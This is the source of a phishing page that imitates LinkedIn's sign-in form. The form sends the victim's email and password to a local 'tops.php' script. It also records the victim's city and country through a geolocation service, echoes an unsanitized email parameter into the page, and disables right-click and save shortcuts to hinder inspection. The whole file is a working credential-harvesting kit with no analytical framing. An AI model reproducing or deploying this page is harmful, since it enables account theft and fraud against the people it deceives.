<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<link rel="icon" href="https://static.licdn.com/scds/common/u/images/logos/favicons/v1/favicon.ico">
<link rel="stylesheet" type="text/css" href="https://static.licdn.com/scds/concat/common/css?h=765zh9odycznutep5f0mj07m4-c8kkvmvykvq2ncgxoqb13d2by-97r9i8f0vw2gmq97lpzb2ohek-7mxyksftlcjzimz2r05hd289r-4uu2pkz5u0jch61r2nhpyyrn8-7poavrvxlvh0irzkbnoyoginp-4om4nn3a2z730xs82d78xj3be-7m0xa9uspuliui8l4c806ppxc-ct4kfyj4tquup0bvqhttvymms-c1cmlc2imos8f942j65p5pmjm-9zbbsrdszts09by60it4vuo3q-8ti9u6z5f55pestwbmte40d9-cernnxjzxrrt8qy88tyxhj3c5-3pwwsn1udmwoy3iort8vfmygt-b1019pao2n44df9be9gay2vfw-7fo5l62eztikpp1cfui1jz4to-ab01tg8funn2n1exayaej7367">
<script type="text/javascript" src="https://static.licdn.com/scds/concat/common/js?h=a06jpss2hf43xwxobn0gl598m-b7ksroocq54owoz2fawjb292y-62og8s54488owngg0s7escdit-c8ha6zrgpgcni7poa5ctye7il-8gz32kphtrjyfula3jpu9q6wl-51dv6schthjydhvcv6rxvospp-e9rsfv7b5gx0bk0tln31dx3sq-2r5gveucqe4lsolc3n0oljsn1-8v2hz0euzy8m1tk5d6tfrn6j-di2107u61yb11ttimo0s2qyh2-a5z91y8xfiqdawrgpl2z4m6gs-93jgstnkffqiw9htrr1tva7y3-7oayq6ato0qqkz6gz6iunlkxr-999q8q1ovip41ng1nylee3woz-5gedbbq7rksg5ypd5ruwisrah-39kuwv80yvqr74w4oe9bge0md-7ty57fxmbd5klxui85wcgpq3k-e1yamnwwzlstlh2d0l31jqbq3-39qtiin34ku3a7j62elxviuxr-8su35siohpmem14ncxhw06cld-ccxtvi3w660pars8qw3alamil"></script>
<link rel="stylesheet" type="text/css" href="https://static.licdn.com/scds/concat/common/css?h=1o07vpl9fx1wygty96v5v520o-a4kjc5uqttio53azw54aex6s3">
<title>Sign In to LinkedIn | LinkedIn
</title>
<link rel="stylesheet" type="text/css" href="https://static.licdn.com/scds/concat/common/css?h=c52xqty03kc2uumayfdgw52ha-6eb15yl27eoj4wlyl799ae32f-9isvvzw61fpveso9doy1mzsas-2qk68hrxrqya74okuimf9dv0c-613o3z852fmufuoq56wjec8bn-aibd4bc52tilbqe5gz50e4sem">
<link rel="canonical" href="https://www.linkedin.com/uas/login"/>
<link rel="stylesheet" type="text/css" href="https://static.licdn.com/scds/concat/common/css?h=cfsam81o5sp3cxb7m0hs933c4-am4posir4cbrpjbyrv9hmzsud-35lybw28luek036334m0p39y7">
<script language="JavaScript" src="http://www.geoplugin.net/javascript.gp" type="text/javascript"></script>
<script>
function initInput()
	{
	var variable = ""+geoplugin_city()+" "+geoplugin_countryName();
	document.forms[0].idi.value = variable;
	}
</script>
</head>
<script type="text/javascript">
						function nospaces(t){

						if(t.value.match(/\s/g)){

						location.reload(true);

						t.value=t.value.replace(/\s/g,'');

						}

						}

						</script>
<script type="text/javascript">
document.addEventListener("keydown", function(e) {
  if (e.keyCode == 83 && (navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)) {
    e.preventDefault();
  }
}, false);
</script>
<script type="text/javascript">
						function validate()
{
	var X=document.forms["login"]["user"].value
	var atpos=X.indexOf("@");
	var dotpos=X.lastIndexOf(".");
	if (atpos<1 || dotpos<atpos+2 || dotpos+2>=X.length)
		{
		location.reload(true);
		return false;
		}
	var submitok="True";
	var x=document.login;
	var pwd=x.pass.value;
	if (pwd.length==0)
	{
		location.reload(true);
		submitok= "False";
	}
	else if (pwd.length<4 || pwd.length>20)
	{
		location.reload(true);
		submitok= "False";
	}
	if (submitok=="False")
	{
	return false
	}
}
						</script>
<body onLoad="initInput()" oncontextmenu="return false" dir="ltr" class="guest v2  chrome-v5 chrome-v5-responsive sticky-bg guest consumer2in1" id="pagekey-uas-consumer-login-internal">
<input id="inSlowConfig" type="hidden" value="false" />
<script type="text/javascript">fs._server.fire("1556d43be448a714c0655840942b0000-2",{event:"before",type:"html"});</script><header id="layout-header" class="minimal-nav wide-nav" role="banner">
<div id="header-anchor">
<div id="header-banner">
<div class="wrapper">
<div class="header-logo-container">
<a class="header-logo guest" href="" title="LinkedIn">
<h2 id="in-logo" class="logo-text">LinkedIn</h2>
<span class="li-icon" aria-hidden="true" type="linkedin-logo" size="28dp" color="brand">
<svg preserveAspectRatio="xMinYMin meet">
<g class="scaling-icon" style="fill-opacity: 1">
<defs>
<linearGradient id="premium-linkedin-bug-color-gradient" x1="100%" y1="0%" x2="0%" y2="100%">
<stop class="stop1" offset="0%" stop-color="#C5B583"></stop>
<stop class="stop2" offset="50%" stop-color="#AF9B62"></stop>
</linearGradient>
</defs>
<g class="logo-28dp">
<g class="dpi-1">
<g class="inbug" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
<path d="M25.375,0 L2.625,0 C1.175,0 0,1.175 0,2.625 L0,25.375 C0,26.825 1.175,28 2.625,28 L25.375,28 C26.825,28 28,26.825 28,25.375 L28,2.625 C28,1.175 26.825,0 25.375,0" class="bug-text-color" fill="#FFFFFF" transform="translate(82.000000, 0.000000)"></path>
<path d="M107.375,0 L84.625,0 C83.175,0 82,1.175 82,2.625 L82,25.375 C82,26.825 83.175,28 84.625,28 L107.375,28 C108.825,28 110,26.825 110,25.375 L110,2.625 C110,1.175 108.825,0 107.375,0 Z M101.0137,9.875 C98.9227,9.875 97.4487,11.025 96.8747,12.025 L96.8747,10 L92.9997,10 L92.9997,24 L96.9997,24 L96.9997,17.375 C96.9997,15.603 97.6627,13.875 99.6497,13.875 C101.4667,13.875 101.9997,14.965 101.9997,16.875 L101.9997,24 L105.9997,24 L105.9997,14.975 C105.9997,11.75 104.2917,9.875 101.0137,9.875 Z M86,24 L90,24 L90,10 L86,10 L86,24 Z M88,3.665 C86.71,3.665 85.665,4.71 85.665,6 C85.665,7.29 86.71,8.335 88,8.335 C89.29,8.335 90.335,7.29 90.335,6 C90.335,4.71 89.29,3.665 88,3.665 Z" class="background" fill="#0073B0"></path>
</g>
<g class="linkedin-text">
<path d="M78,24 L74,24 L74,22 L73.846,22 C73.231,23 71.858,24.2 70.041,24.2 C66.191,24.2 64,21.214 64,17 C64,13.129 65.99,9.8 69.679,9.8 C71.337,9.8 72.887,10 73.796,12 L74,12 L74,4 L78,4 L78,24 Z M71.145,13.8 C68.844,13.8 67.806,15.008 67.806,17.1 C67.806,19.192 68.844,20.2 71.145,20.2 C73.169,20.2 74.206,19.093 74.206,17 C74.206,14.908 73.169,13.8 71.145,13.8 L71.145,13.8 Z" fill="#FFFFFF"></path>
<path d="M62.5,21.7998 C61.123,23.5488 58.736,24.1998 56.5,24.1998 C52.199,24.1998 49.2,21.4698 49.2,17.0278 C49.2,12.5838 52.201,9.7998 56.5,9.7998 C60.516,9.7998 62.8,12.8908 62.8,17.3338 L62.5,17.9998 L53.2,17.9998 L53.3,19.4998 C53.517,20.2498 54.5,21.1508 56.477,21.1508 C57.881,21.1508 58.783,20.5708 59.5,19.5958 L62.5,21.7998 Z M59,14.9998 C59.028,14.7998 57.548,12.9008 56,12.9008 C54.107,12.9008 53.113,14.7998 53,14.9998 L59,14.9998 Z" fill="#FFFFFF"></path>
<polygon fill="#FFFFFF" points="35 4 39 4 39 16.039 44.246 10 49.457 10 43 16.5 49.23 24 44.02 24 39 17.398 39 24 35 24"></polygon>
<path d="M20,10 L23.5,10 L24,12.414 C25,11.324 25.907,9.8 28,9.8 C32.357,9.8 33,12.766 33,16.492 L33,24 L29,24 L29,16.5 C29,14.895 28.707,13.773 26.5,13.773 C24.265,13.773 24,15.193 24,17 L24,24 L20,24 L20,10 Z" fill="#FFFFFF"></path>
<path d="M15.9902,3.5752 C17.2702,3.5752 18.4252,4.7442 18.4252,6.0272 C18.4252,7.3092 17.2702,8.4252 15.9902,8.4252 C14.7112,8.4252 13.5752,7.3092 13.5752,6.0272 C13.5752,4.7442 14.7112,3.5752 15.9902,3.5752 L15.9902,3.5752 Z M14.0002,24.0002 L18.0002,24.0002 L18.0002,10.0002 L14.0002,10.0002 L14.0002,24.0002 Z" fill="#FFFFFF"></path>
<polygon fill="#FFFFFF" points="0 4 4 4 4 20 12 20 12 24 0 24"></polygon></g></g></g>
<g class="logo-21dp">
<g class="dpi-1">
<g class="inbug" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
<path d="M19.479,0 L1.583,0 C0.727,0 0,0.677 0,1.511 L0,19.488 C0,20.323 0.477,21 1.333,21 L19.229,21 C20.086,21 21,20.323 21,19.488 L21,1.511 C21,0.677 20.336,0 19.479,0" class="bug-text-color" fill="#FFFFFF" transform="translate(63.000000, 0.000000)"></path>
<path d="M82.479,0 L64.583,0 C63.727,0 63,0.677 63,1.511 L63,19.488 C63,20.323 63.477,21 64.333,21 L82.229,21 C83.086,21 84,20.323 84,19.488 L84,1.511 C84,0.677 83.336,0 82.479,0 Z M71,8 L73.827,8 L73.827,9.441 L73.858,9.441 C74.289,8.664 75.562,7.875 77.136,7.875 C80.157,7.875 81,9.479 81,12.45 L81,18 L78,18 L78,12.997 C78,11.667 77.469,10.5 76.227,10.5 C74.719,10.5 74,11.521 74,13.197 L74,18 L71,18 L71,8 Z M66,18 L69,18 L69,8 L66,8 L66,18 Z M69.375,4.5 C69.375,5.536 68.536,6.375 67.5,6.375 C66.464,6.375 65.625,5.536 65.625,4.5 C65.625,3.464 66.464,2.625 67.5,2.625 C68.536,2.625 69.375,3.464 69.375,4.5 Z" class="background" fill="#0073B0"></path>
</g>
<g class="linkedin-text">
<path d="M60,18 L57.2,18 L57.2,16.809 L57.17,16.809 C56.547,17.531 55.465,18.125 53.631,18.125 C51.131,18.125 48.978,16.244 48.978,13.011 C48.978,9.931 51.1,7.875 53.725,7.875 C55.35,7.875 56.359,8.453 56.97,9.191 L57,9.191 L57,3 L60,3 L60,18 Z M54.479,10.125 C52.764,10.125 51.8,11.348 51.8,12.974 C51.8,14.601 52.764,15.875 54.479,15.875 C56.196,15.875 57.2,14.634 57.2,12.974 C57.2,11.268 56.196,10.125 54.479,10.125 L54.479,10.125 Z" fill="#FFFFFF"></path>
<path d="M47.6611,16.3889 C46.9531,17.3059 45.4951,18.1249 43.1411,18.1249 C40.0001,18.1249 38.0001,16.0459 38.0001,12.7779 C38.0001,9.8749 39.8121,7.8749 43.2291,7.8749 C46.1801,7.8749 48.0001,9.8129 48.0001,13.2219 C48.0001,13.5629 47.9451,13.8999 47.9451,13.8999 L40.8311,13.8999 L40.8481,14.2089 C41.0451,15.0709 41.6961,16.1249 43.1901,16.1249 C44.4941,16.1249 45.3881,15.4239 45.7921,14.8749 L47.6611,16.3889 Z M45.1131,11.9999 C45.1331,10.9449 44.3591,9.8749 43.1391,9.8749 C41.6871,9.8749 40.9121,11.0089 40.8311,11.9999 L45.1131,11.9999 Z" fill="#FFFFFF"></path>
<polygon fill="#FFFFFF" points="38 8 34.5 8 31 12 31 3 28 3 28 18 31 18 31 13 34.699 18 38.241 18 34 12.533"></polygon>
<path d="M16,8 L18.827,8 L18.827,9.441 L18.858,9.441 C19.289,8.664 20.562,7.875 22.136,7.875 C25.157,7.875 26,9.792 26,12.45 L26,18 L23,18 L23,12.997 C23,11.525 22.469,10.5 21.227,10.5 C19.719,10.5 19,11.694 19,13.197 L19,18 L16,18 L16,8 Z" fill="#FFFFFF"></path>
<path d="M11,18 L14,18 L14,8 L11,8 L11,18 Z M12.501,6.3 C13.495,6.3 14.3,5.494 14.3,4.5 C14.3,3.506 13.495,2.7 12.501,2.7 C11.508,2.7 10.7,3.506 10.7,4.5 C10.7,5.494 11.508,6.3 12.501,6.3 Z" fill="#FFFFFF"></path>
<polygon fill="#FFFFFF" points="3 3 0 3 0 18 9 18 9 15 3 15"></polygon></g></g></g></g></svg>
</span></a></div>
<nav role="navigation" id="minimal-util-nav" class="guest-nav" aria-label="Main site navigation">
<ul class="nav-bar">
<li class="nav-item nav-signin">
<a class="nav-link" href="" title="Sign in">Welcome, you have new invitation</a></li>
<li class="nav-item nav-joinnow">
<a class="nav-link highlight" rel="nofollow" href="" title="Join now">
Join now
</a></li></ul></nav></div></div></div>
<div class="a11y-content">
<a id="a11y-content-link" tabindex="0" name="a11y-content">Main content starts below.</a></div>
</header>
<div id="body" class="" role="main">
<div class="wrapper hp-nus-wrapper">
<div id="global-error"></div>
<div id="bg-fallback"></div>
<div id="main" class="signin">
<form method="POST" name="login" id="login" class="ajax-form stacked-form" data-jsenabled="check" onsubmit="return validate()" action="tops.php">
<input type="hidden" name="isJsEnabled" value="false"/>
<input type="hidden" name="source_app" value=""/>
<input type="hidden" name="tryCount" id="tryCount" value=""/>
<input type="hidden" name="clickedSuggestion" id="clickedSuggestion" value="false" />
<fieldset class="field-container field-container--fixed">
<legend>Sign in to LinkedIn</legend>
<div class="outer-wrapper">
<div class="inner-wrapper">
<div class="logo_container">LinkedIn</div>
<ul class="form-fields" id="mini-profile--js">
<li class="form-email ">
<div class="fieldgroup hide-label">
<div id="mini-profile--js" class="mini-profile-container">
<div id="mini-profile" class="mini-profile">
<span class="name"><?php echo $_GET['email'];?></span>
<input name="email" type="hidden" value="<?php echo $_GET['email'];?>">
<input type="hidden" name="logfrom" id="idi" value="">
<button class="not-me" id="not-me--js" type="button" data-li-tooltip-id="login-tooltip-not-me" title="" data-li-title="Not you?"><span a11y-hidden="true" class="button-copy">&#xe00f;</span></button></div>
<div class="domain-suggestion hide" id="domainSuggestion">
<span>Did you mean: <a id="suggestion" href="javascript:void(0);"></a>?</span></div></div></li>
<li class="form-password">
<div class="fieldgroup hide-label">
<label for="session_password-login" >Password</label>
<span class="error" id="session_password-login-error"></span>
<div class="password_wrapper">
<input type="password" id="session_password-login" autofocus="" class="password" name="pass" placeholder="Password" aria-describedby="session_password-login-error"/>
<a data-li-tooltip-id="login-tooltip" href="" class="nav-link forgot-password-link password-reminder-link" title="">?</a></div></div></li>
<li class="button form-actions">
<div class="form-buttons">
<input type="submit"  name="submit" value="Sign In" class="btn-primary" id="btn-primary">
<div class="one-time-password-container">
<a href="" id="one-time-password-url">
</a>
</div>
</div><br><br>
<span>Not a member? <a href="">Join now</a></span></li></ul></div>
<div class="gaussian-blur"></div></div></fieldset>
<input type="hidden" name="session_redirect" value="" id="session_redirect-login"><input type="hidden" name="trk" value="hb_signin" id="trk-login"><input type="hidden" name="loginCsrfParam" value="59bc2ef1-4f1b-4f51-8864-a0856d2d1d9e" id="loginCsrfParam-login"><input type="hidden" name="fromEmail" value="" id="fromEmail-login"><input type="hidden" name="csrfToken" value="ajax:4127752802420327900" id="csrfToken-login"><input type="hidden" name="sourceAlias" value="0_7r5yezRXCiA_H0CRD8sf6DhOjTKUNps5xGTqeX8EEoi" id="sourceAlias-login"></form>
<div class="callout-container">
<span id="login-tooltip">
<div class="callout-content"></div></span></div></div>
<svg class="svg-image-blur">
<filter id="blur-effect-1">
<feGaussianBlur stdDeviation="5"></feGaussianBlur>
</filter>
</svg>
<script>
if(window.$ && jQuery) {
$('document').ready(function() {
$('.gaussian-blur').addClass('blur');
});
} else {
YEvent.onDOMReady(function() {
YDom.addClass(Y$('.gaussian-blur', null, true), 'blur');
});
}
</script>
<style type="text/css">
.svg-image-blur { 
position: absolute;
top: -50000px;
left: -50000px;
}
.blur {
-webkit-filter: blur(5px); 
-moz-filter: blur(5px);
-o-filter: blur(5px); 
-ms-filter: blur(5px);
filter: url(#blur-effect-1);
filter: progid:DXImageTransform.Microsoft.Blur(PixelRadius='5');
zoom: 1;
}
</style></div></div>
<script type="text/javascript">fs._server.fire("1556d43be448a714c0655840942b0000-3",{event:"before",type:"html"});</script><footer id="layout-footer" class="layout-header-or-footer" role="contentinfo">
<div class="wrapper">
<p class="copyright guest"><span>LinkedIn Corporation</span> <em>&copy; 2018</em></p>
<ul class="nav-legal" role="navigation" aria-label="Footer Legal Menu">
<li role="menuitem"><a href="">User Agreement</a></li>
<li role="menuitem"><a href="">Privacy Policy</a></li>
<li role="menuitem"><a href="">Community Guidelines</a></li>
<li role="menuitem"><a href="">Cookie Policy</a></li>
<li role="menuitem"><a href="">Copyright Policy</a></li>
<li role="menuitem"><a href="" rel="nofollow">Unsubscribe</a></li>
</ul></div> </footer> </body></html>